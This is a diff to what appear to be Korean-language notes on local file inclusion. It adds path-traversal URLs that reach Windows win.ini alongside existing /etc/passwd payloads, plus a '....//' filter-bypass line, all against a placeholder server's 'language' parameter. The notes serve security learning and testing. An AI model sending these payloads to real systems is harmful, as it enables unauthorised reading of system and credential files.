@@ -270,9 +270,15 @@ C:\Windows\System32\drivers\etc\hosts  # hosts 파일
 http://<SERVER_IP>:<PORT>/index.php?language=etc/passwd
 http://<SERVER_IP>:<PORT>/index.php?language=../../../etc/passwd
 
+http://<SERVER_IP>:<PORT>/index.php?language=windows/win.ini
+http://<SERVER_IP>:<PORT>/index.php?language=../../../windows/win.ini
+
 # 절대 경로 시도
 http://<SERVER_IP>:<PORT>/index.php?language=/etc/passwd
 http://<SERVER_IP>:<PORT>/index.php?language=/../../../etc/passwd
+
+http://<SERVER_IP>:<PORT>/index.php?language=/windows/win.ini
+http://<SERVER_IP>:<PORT>/index.php?language=/../../../windows/win.ini
 
 # 필터 우회 - 점과 슬래시 조합
 http://<SERVER_IP>:<PORT>/index.php?language=....//....//....//....//etc/passwd
